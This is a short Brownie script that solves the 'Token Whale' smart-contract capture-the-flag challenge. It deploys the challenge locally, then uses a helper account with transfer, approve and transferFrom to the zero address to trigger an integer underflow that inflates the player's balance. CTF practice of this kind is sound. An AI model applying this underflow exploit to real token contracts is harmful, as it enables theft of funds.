from brownie import TokenWhaleChallenge, accounts, ZERO_ADDRESS


def main():
    deployer = accounts[0]
    player = accounts[1]
    helper = accounts[2]

    contract = TokenWhaleChallenge.deploy(player,
                                          {'from': deployer})

    contract.transfer(helper, 505, {'from': player})
    contract.approve(player, 500, {'from': helper})
    contract.transferFrom(helper, ZERO_ADDRESS, 500, {'from': player})

    assert contract.isComplete() == True
